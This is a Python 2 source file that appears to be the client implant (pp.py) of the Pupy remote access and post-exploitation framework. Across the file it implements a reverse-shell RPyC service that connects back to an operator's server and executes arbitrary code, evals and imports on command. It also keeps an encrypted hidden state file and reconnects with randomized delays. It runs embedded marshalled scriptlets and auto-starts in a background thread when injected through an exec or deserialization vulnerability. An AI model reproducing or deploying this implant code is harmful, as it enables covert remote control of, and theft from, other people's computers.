#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice,
# this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
# may be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------

import sys
import imp

try:
    import pupy
    setattr(pupy, 'pseudo', False)

except ImportError, e:
    mod = imp.new_module("pupy")
    mod.__name__ = "pupy"
    mod.__file__ = "pupy://pupy"
    mod.__package__ = "pupy"
    sys.modules["pupy"] = mod
    mod.pseudo = True

    import pupy

import socket
socket.setdefaulttimeout(60)

import logging

logging.basicConfig()
root_logger = logging.getLogger()
root_logger.setLevel(logging.WARNING)

logger = root_logger.getChild('pp')

from rpyc.core.service import Service, ModuleNamespace
from rpyc.lib.compat import execute

import threading
import traceback
import os
import json
import platform
import random
import argparse

from network import conf
from network.lib.base_launcher import LauncherError
from network.lib.connection import PupyConnection
from network.lib.streams.PupySocketStream import PupyChannel
from network.lib.buffer import Buffer

import shlex
import zlib
import signal

import time

import cPickle
import ssl

import hashlib
import uuid
from network.lib.transports.cryptoutils.aes import \
     NewAESCipher as AES, \
     append_PKCS7_padding as pad, \
     strip_PKCS7_padding as unpad

try:
    # additional imports needed to package with pyinstaller
    import additional_imports
    assert additional_imports

except ImportError:
    pass

except Exception as e:
    logger.warning(e)

import umsgpack

pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
pupy.namespace = None

if not sys.platform == 'win32' and not pupy.pseudo:
    setattr(ssl, '_SSL_FILES', [
        "/etc/ssl/certs/ca-certificates.crt",
        "/etc/pki/tls/certs/ca-bundle.crt",
        "/etc/ssl/ca-bundle.pem",
        "/etc/pki/tls/cacert.pem",
        "/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem",
    ])

    setattr(ssl, '_SSL_PATHS', [
        "/etc/ssl/certs",
        "/system/etc/security/cacerts",
        "/usr/local/share/certs",
        "/etc/pki/tls/certs",
        "/etc/openssl/certs",
        "/etc/opt/csw/ssl/certs",
    ])

    def set_default_verify_paths(self):
        for path in ssl._SSL_PATHS:
            try:
                self.load_verify_locations(capath=path)
            except:
                pass

        for path in ssl._SSL_FILES:
            try:
                self.load_verify_locations(cafile=path)
            except:
                pass

        del path

    ssl.SSLContext.set_default_verify_paths = set_default_verify_paths

def defered_close_exit(connection):
    try:
        # Should be the custom event, as generated on client
        broadcast_event(0x10000000 | 0xFFFF)
    except Exception, e:
        logger.exception(e)

    logger.debug('Defered close+exit')

    sys.terminated = True

    if connection:
        connection.close()

def broadcast_event(eventid):
    if pupy.connection:
        logger.debug(
            'Pupy connected: broadcast event via connection. EventId = %08x',
            eventid)

        pupy.connection.root.broadcast_event(eventid)

    elif pupy.broadcast_event:
        logger.debug(
            'Pupy is not connected, but broadcast_event defined (%s). EventId = %08x',
            pupy.broadcast_event, eventid)
        pupy.broadcast_event(eventid)
        logger.debug('Pupy connected: broadcast completed')
    else:
        logger.debug(
            'No way to report event. EventId = %08x', eventid)

def print_exception(tag=''):
    global debug

    remote_print_error = None
    dprint = None

    trace = str(traceback.format_exc())
    error = ' '.join([
        x for x in (
            tag, 'Exception:', trace
        ) if x
    ])

    try:
        import pupyimporter
        remote_print_error = pupyimporter.remote_print_error
        dprint = pupyimporter.dprint
    except:
        pass

    if remote_print_error:
        try:
            dprint('Remote error: {}'.format(error))
            remote_print_error(error)
        except:
            pass

    elif dprint:
        dprint(error)
    elif debug:
        try:
            logger.error(error)
        except:
            print error

class PStore(object):

    __slots__ = (
        '_pstore_path', '_pstore_key', '_pstore'
    )

    def __new__(cls, *args, **kw):
        if not hasattr(cls, '_instance'):
            orig = super(PStore, cls)
            cls._instance = orig.__new__(cls, *args, **kw)

        return cls._instance

    def __init__(self, pstore_dir='~'):
        try:
            import getpass
            uid = getpass.getuser()
        except:
            uid = os.getuid()

        seed = '{}:{}'.format(uid, uuid.getnode())

        h = hashlib.sha1()
        h.update(seed)

        if os.name == 'posix':
            if pstore_dir == '~':
                pstore_dir = os.path.join(pstore_dir, '.cache')
            pstore_name = '.{}'.format(h.hexdigest())
        else:
            if pstore_dir == '~':
                pstore_dir = os.path.join(
                    pstore_dir, 'AppData', 'Local', 'Temp'
                )
            pstore_name = h.hexdigest()

        self._pstore_path = os.path.expanduser(
            os.path.join(pstore_dir, pstore_name)
        )

        h = hashlib.sha1()
        h.update('password' + seed)

        self._pstore_key = (h.digest()[:16], '\x00'*16)
        self._pstore = {}

        self.load()

    def __getitem__(self, key):
        if issubclass(type(key), object):
            key = type(key).__name__
        return self._pstore.get(key)

    def __setitem__(self, key, value):
        if issubclass(type(key), object):
            key = type(key).__name__
        self._pstore[key] = value

    def load(self):
        if not os.path.exists(self._pstore_path):
            return

        data = None
        try:
            with open(self._pstore_path, 'rb') as pstore:
                data = pstore.read()

            try:
                os.unlink(self._pstore_path)
            except:
                print_exception('PS/L')

            if not data:
                return

            data = AES(*self._pstore_key).decrypt(data)
            data = unpad(data)
            data = cPickle.loads(data)
        except:
            print_exception('[PS/L]')
            return

        if type(data) == dict:
            self._pstore.update(data)

    def store(self):
        if not self._pstore:
            return

        pstore_dir = os.path.dirname(self._pstore_path)
        try:
            if not os.path.isdir(pstore_dir):
                os.makedirs(pstore_dir)

            with open(self._pstore_path, 'w+b') as pstore:
                data = cPickle.dumps(self._pstore)
                data = pad(data)
                data = AES(*self._pstore_key).encrypt(data)
                pstore.write(data)

        except:
            print_exception('[PS/S]')
            return


class Task(threading.Thread):

    __slots__ = (
        '_pstore', '_stopped', '_manager', '_dirty', '_event_id'
    )

    stopped = None
    results_type = list
    event_id = None

    def __init__(self, manager, *args, **kwargs):
        threading.Thread.__init__(self)

        self._event_id = kwargs.pop('event_id', self.event_id)

        self.daemon = True
        self._pstore = manager.pstore
        self._stopped = threading.Event()
        if not self._pstore[self]:
            self._pstore[self] = self.results_type()
        self._manager = manager
        self._dirty = False

        logger.debug('Create task %s', self.__class__.__name__)

    @property
    def name(self):
        return type(self).__name__

    @property
    def results(self):
        results = self._pstore[self]
        self._pstore[self] = self.results_type()
        self._dirty = False
        return results

    @property
    def dirty(self):
        return self._dirty

    def append(self, result):
        if self.results_type in (str, unicode):
            self._pstore[self] += result
        elif self.results_type == list:
            self._pstore[self].append(result)
        elif self.results_type == set:
            self._pstore[self].add(result)
        else:
            raise TypeError('Unknown results type: {}'.format(self.results_type))

        fire_event = False

        if not self._dirty:
            fire_event = True

        self._dirty = True

        try:
            if fire_event and self._event_id is not None:
                self.broadcast_event(self._event_id)
        except:
            print_exception('T/BE:{}'.format(self.name))

    def broadcast_event(self, eventid):
        broadcast_event(eventid)

    def stop(self):
        logger.debug('Stopping task %s', self.__class__.__name__)

        if self._stopped and self.active:
            self._stopped.set()

    def run(self):
        logger.debug('Task %s started', self.__class__.__name__)
        try:
            self.task()
        except:
            print_exception('[T/R:{}]'.format(self.name))
            if self._stopped:
                self._stopped.set()
        finally:
            logger.debug('Task %s completed', self.__class__.__name__)

    @property
    def active(self):
        if self._stopped is None:
            return False

        try:
            return not self._stopped.is_set()

        except:
            print_exception('[T/A:{}]'.format(self.name))
            return False

    def event(self, event):
        pass

class Manager(object):
    TERMINATE = 0
    PAUSE = 1
    SESSION = 2

    __slots__ = ('tasks', 'pstore')

    def __new__(cls, *args, **kw):
        if not hasattr(cls, '_instance'):
            orig = super(Manager, cls)
            cls._instance = orig.__new__(cls, *args, **kw)

        return cls._instance

    def __init__(self, pstore):
        self.tasks = {}
        self.pstore = pstore

    def get(self, klass):
        name = klass.__name__
        return self.tasks.get(name)

    def create(self, klass, *args, **kwargs):
        name = klass.__name__
        if name not in self.tasks:
            try:
                task = klass(self, *args, **kwargs)
                task.start()
                self.tasks[name] = task
                return task

            except:
                print_exception('[M/C:{}]'.format(name))

    def stop(self, klass, force=False):
        name = klass.__name__
        if name in self.tasks:
            try:
                self.tasks[name].stop()
                del self.tasks[name]
            except:
                print_exception('[M/S:{}]'.format(name))
                if force:
                    del self.tasks[name]

    def active(self, klass=None):
        name = klass.__name__
        if name in self.tasks:
            if not self.tasks[name].stopped:
                # Failed somewhere in the middle
                del self.tasks[name]
                return False

            return self.tasks[name].stopped.is_set()
        else:
            return False

    @property
    def dirty(self):
        return any(x.dirty for x in self.tasks.itervalues())

    @property
    def status(self):
        return {
            name:{
                'active': task.active,
                'results': task.dirty,
            } for name,task in self.tasks.iteritems()
        }

    def event(self, event):
        for task in self.tasks.itervalues():
            try:
                task.event(event)
            except:
                print_exception('[M/E:{}:{}]'.format(task.name, event))

        if event == self.TERMINATE:
            for task in self.tasks.itervalues():
                try:
                    task.stop()
                except:
                    print_exception('[M/E:{}:{}]'.format(task.name, event))

            self.pstore.store()

def safe_obtain(proxy):
    """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """

    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
        return proxy

    try:
        conn = object.__getattribute__(proxy, "____conn__")()
    except:
        return proxy

    if not hasattr(conn, 'obtain'):
        setattr(conn, 'obtain', conn.root.msgpack_dumps)

    return umsgpack.loads(
        zlib.decompress(
            conn.obtain(proxy, compressed=True)
        )
    ) # should prevent any code execution

setattr(pupy, 'manager', Manager(PStore()))
setattr(pupy, 'Task', Task)
setattr(pupy, 'connection', None)
setattr(pupy, 'obtain', safe_obtain) # I don't see a better spot to put this util
setattr(pupy, 'creds_cache', {})
setattr(pupy, 'broadcast_event', None)
setattr(pupy, 'cid', None)
setattr(pupy, 'sleep', None)

setattr(sys, 'terminated', False)
setattr(sys, 'terminate', None)

class UpdatableModuleNamespace(ModuleNamespace):
    __slots__ = ['__invalidate__']

    def __invalidate__(self, name):
        cache = self._ModuleNamespace__cache
        if name in cache:
            del cache[name]

class ReverseSlaveService(Service):
    """ Pupy reverse shell rpyc service """
    __slots__ = ["exposed_namespace", "exposed_cleanups"]

    def __init__(self, conn):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn = conn

    def on_connect(self):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)

        infos = Buffer()
        umsgpack.dump(self.exposed_get_infos(), infos)

        pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
        self._conn.root.initialize_v1(
            self.exposed_namespace,
            pupy.namespace,
            sys.modules['__builtin__'],
            self.exposed_register_cleanup,
            self.exposed_unregister_cleanup,
            self.exposed_obtain_call,
            self.exposed_exit,
            self.exposed_eval,
            self.exposed_execute,
            sys.modules.get('pupyimporter'),
            infos
        )

    def on_disconnect(self):
        if sys.terminated:
            return

        for cleanup in self.exposed_cleanups:
            try:
                cleanup()
            except:
                print_exception('[D]')

        self.exposed_cleanups = []

        try:
            self._conn.close()
        except:
            print_exception('[DC]')

        if os.name == 'posix':
            try:
                pid = os.waitpid(-1, os.WNOHANG)
                attempt = 0
                while pid != 0 and attempt < 1024:
                    pid = os.waitpid(-1, os.WNOHANG)
                    attempt += 1

            except OSError:
                pass


    def exposed_exit(self):
        logger.debug('TERMINATION REQUEST')

        if hasattr(pupy, 'manager'):
            logger.debug('Send termination event to all tasks')
            pupy.manager.event(Manager.TERMINATE)

        sys.terminated = True

        if self._conn:
            self._conn.close()

        if sys.terminate:
            sys.terminate()

        for thread in threading.enumerate():
            if not thread.daemon:
                logger.debug('Non daemon thread: %s', thread)


    def exposed_register_cleanup(self, method):
        self.exposed_cleanups.append(method)

    def exposed_unregister_cleanup(self, method):
        self.exposed_cleanups.remove(method)

    def exposed_execute(self, text):
        """execute arbitrary code (using ``exec``)"""
        execute(text, self.exposed_namespace)

    def exposed_get_infos(self, s=None):
        import pupy

        if not s:
            return {
                k:v for k,v in pupy.infos.iteritems() if k not in (
                    'launcher_inst',
                )
            }

        if s not in pupy.infos:
            return None

        return pupy.infos[s]

    def exposed_eval(self, text):
        """evaluate arbitrary code (using ``eval``)"""
        return eval(text, self.exposed_namespace)

    def exposed_getmodule(self, name):
        """imports an arbitrary module"""
        return __import__(name, None, None, "*")

    def exposed_obtain_call(self, function, packed_args):
        if packed_args is not None:
            packed_args = zlib.decompress(packed_args)
            args, kwargs = umsgpack.loads(packed_args)
        else:
            args, kwargs = [], {}

        result = function(*args, **kwargs)

        packed_result = umsgpack.dumps(result)
        packed_result = zlib.compress(packed_result)

        return packed_result

    def exposed_msgpack_dumps(self, obj, compressed=False):
        data = Buffer(compressed=compressed)
        umsgpack.dump(obj, data)
        data.flush()
        return data

    def exposed_json_dumps(self, obj, compressed=False):
        try:
            data = json.dumps(obj, ensure_ascii=False)
        except:
            try:
                import locale
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding=locale.getpreferredencoding()
                )
            except:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding='latin1'
                )

        if compressed:
            if type(data) == unicode:
                data = data.encode('utf-8')

            data = zlib.compress(data)

        return data

    def exposed_getconn(self):
        """returns the local connection instance to the other side"""
        return self._conn


class BindSlaveService(ReverseSlaveService):

    def on_connect(self):
        try:
            from pupy_credentials import BIND_PAYLOADS_PASSWORD
            password = BIND_PAYLOADS_PASSWORD
        except ImportError:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            password = credentials['BIND_PAYLOADS_PASSWORD']

        if self._conn.root.get_password() != password:
            self._conn.close()
            raise KeyboardInterrupt("wrong password")

        super(BindSlaveService, self).on_connect()


def get_next_wait(attempt):
    try:
        for conf_attempt, delay_min, delay_max in DELAYS:
            if conf_attempt == -1 or attempt < conf_attempt:
                return random.randint(delay_min, delay_max)
    except Exception as e:
        logger.exception('get_next_wait %d, %s', attempt, e)

    return random.randint(150, 300)

def set_connect_back_host(HOST):
    import pupy
    pupy.get_connect_back_host = (lambda: HOST)

def handle_sigchld(*args, **kwargs):
    os.waitpid(-1, os.WNOHANG)

def handle_sighup(signal, frame):
    logger.debug('SIGHUP')

def handle_sigterm(signal, frame):
    logger.warning('SIGTERM')

    manager = None

    if hasattr(pupy, 'manager'):
        manager = pupy.manager

    if manager:
        try:
            manager.event(Manager.TERMINATE)
        except Exception as e:
            logger.exception(e)

    if pupy.connection:
        pupy.connection.defer(
            logger.exception,
            defered_close_exit,
            pupy.connection)
    else:
        defered_close_exit(None)

    logger.warning('SIGTERM HANDLED')

attempt = 0

debug = False
CONFIGURATION_CID = 0x31337
DELAYS = [(10, 5, 10), (50, 30, 50), (-1, 150, 300)]
SCRIPTLETS = ''

LAUNCHER = "connect"  # the default launcher to start when no argv
# default launcher arguments
LAUNCHER_ARGS = shlex.split("--host 127.0.0.1:443 --transport ssl")

REVERSE_SLAVE_CONF = dict(
    allow_all_attrs=True,
    allow_public_attrs=True,
    allow_pickle=True,
    allow_getattr=True,
    allow_setattr=True,
    allow_delattr=True,
    import_custom_exceptions=False,
    propagate_SystemExit_locally=True,
    propagate_KeyboardInterrupt_locally=True,
    instantiate_custom_exceptions=True,
    instantiate_oldstyle_exceptions=True,
)

setattr(pupy, 'cid', CONFIGURATION_CID)

def main():
    global LAUNCHER
    global LAUNCHER_ARGS
    global debug
    global attempt

    if hasattr(pupy, 'initialized'):
        return

    setattr(pupy, 'initialized', True)

    try:
        if hasattr(signal, 'SIGHUP'):
            signal.signal(signal.SIGHUP, handle_sighup)
        if hasattr(signal, 'SIGTERM'):
            signal.signal(signal.SIGTERM, handle_sigterm)
    except:
        print_exception('[MS]')

    if hasattr(pupy, 'set_exit_session_callback'):
        pupy.set_exit_session_callback(handle_sigterm)

    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            prog='pp.py',
            formatter_class=argparse.RawTextHelpFormatter,
            description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
        parser.add_argument(
            '--debug',
            action='store_true',
            help="increase verbosity")
        parser.add_argument(
            'launcher',
            choices=[
                x for x in conf.launchers],
            help="the launcher to use")
        parser.add_argument(
            'launcher_args',
            nargs=argparse.REMAINDER,
            help="launcher arguments")
        args = parser.parse_args()

        if not debug:
            debug = bool(args.debug)

        LAUNCHER = args.launcher
        LAUNCHER_ARGS = shlex.split(' '.join(args.launcher_args))

    if hasattr(pupy, 'get_pupy_config'):
        try:
            config_file = pupy.get_pupy_config()
            exec config_file in globals()
        except ImportError as e:
            logger.warning(
                "ImportError: Couldn't load pupy config: {}".format(e))

    if LAUNCHER not in conf.launchers:
        sys.exit("No such launcher: %s" % LAUNCHER)

    if debug:
        import tempfile

        root_logger.handlers = []

        log_file_path = os.path.join(
            tempfile.mkdtemp(prefix='pupy-'),
            'pupy-client-{}-{}-debug.log'.format(int(time.time()), os.getpid()))

        pupy.infos['debug_logfile'] = log_file_path

        log_to_file = logging.FileHandler(log_file_path)
        log_to_file.setLevel(logging.DEBUG)
        log_to_file.setFormatter(
            logging.Formatter(
                '%(asctime)-15s|%(levelname)-5s|%(relativeCreated)6d|%(threadName)s|%(name)s| %(message)s'))
        log_to_con = logging.StreamHandler()
        log_to_con.setLevel(logging.DEBUG)
        log_to_con.setFormatter(logging.Formatter('%(asctime)-15s| %(message)s'))

        root_logger.addHandler(log_to_file)
        root_logger.addHandler(log_to_con)
        root_logger.setLevel(logging.DEBUG)

        root_logger.info('\nLogFile: %s\n', log_file_path)

    launcher = conf.launchers[LAUNCHER]()

    try:
        launcher.parse_args(LAUNCHER_ARGS)
    except LauncherError as e:
        launcher.arg_parser.print_usage()
        sys.exit(e)

    if pupy.pseudo:
        set_connect_back_host(launcher.get_host())
    else:
        pupy.get_connect_back_host = launcher.get_host

    pupy.infos['launcher'] = LAUNCHER
    pupy.infos['launcher_args'] = LAUNCHER_ARGS
    pupy.infos['launcher_inst'] = launcher
    pupy.infos['transport'] = launcher.get_transport()
    pupy.infos['debug'] = debug
    pupy.infos['native'] = pupy.pseudo is False
    pupy.infos['revision'] = getattr(pupy, 'revision', None)
    pupy.infos['cid'] = CONFIGURATION_CID

    if SCRIPTLETS:
        logger.debug('Start scriptlets')
        import marshal
        exec marshal.loads(SCRIPTLETS)
        logger.debug('Scriptlets completed')

    logger.debug('Starting rpyc loop')

    while not sys.terminated:
        try:
            rpyc_loop(launcher)

        except Exception as e:
            print_exception('[ML]')

            if type(e) == SystemExit:
                sys.terminated = True

        finally:
            if not sys.terminated:
                sleep_secs = pupy.sleep if pupy.sleep else get_next_wait(attempt)
                logger.info(
                    'Attempt %d - reconnect in %d seconds...',
                    attempt, sleep_secs)
                time.sleep(sleep_secs)

                pupy.sleep = None
                attempt += 1

    logger.debug('Exited')

def rpyc_loop(launcher):
    global attempt
    global debug

    stream = None
    for ret in launcher.iterate():
        logger.debug('Operation state: Terminated = %s', sys.terminated)

        if sys.terminated:
            logger.warning('Loop terminated')
            break

        logger.debug('Acquire launcher: %s', ret)

        try:
            if isinstance(ret, tuple):  # bind payload
                server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                s = server_class(
                    BindSlaveService,
                    port=port,
                    hostname=address,
                    authenticator=authenticator,
                    stream=stream,
                    transport=transport,
                    transport_kwargs=transport_kwargs,
                    pupy_srv=None,
                )

                sys.terminate = s.close
                pupy.connection = s

                attempt = 0
                s.start()
                sys.terminate = None

            else:  # connect payload
                stream = ret

                conn = PupyConnection(
                    None, ReverseSlaveService,
                    PupyChannel(stream), config={},
                    ping=stream.KEEP_ALIVE_REQUIRED
                )

                conn.init()

                attempt = 0
                pupy.connection = conn
                conn.loop()

        except SystemExit:
            raise

        except EOFError:
            pass

        except:
            print_exception('[M]')

        finally:
            logger.debug('Launcher completed')
            pupy.connection = None

            if stream is not None:
                try:
                    stream.close()
                except:
                    pass

        if sys.terminated:
            break

if __name__ == "__main__":
    main()

    if __debug__:
        for thread in threading.enumerate():
            print "> ALIVE:", thread, thread.daemon
else:
    if not platform.system() == 'android':
        if not hasattr(platform, 'pupy_thread'):
            # to allow pupy to run in background when imported or injected
            # through a python application exec/deserialization vulnerability
            t = threading.Thread(target=main)
            t.daemon = True
            t.start()
            setattr(platform, 'pupy_thread', t)
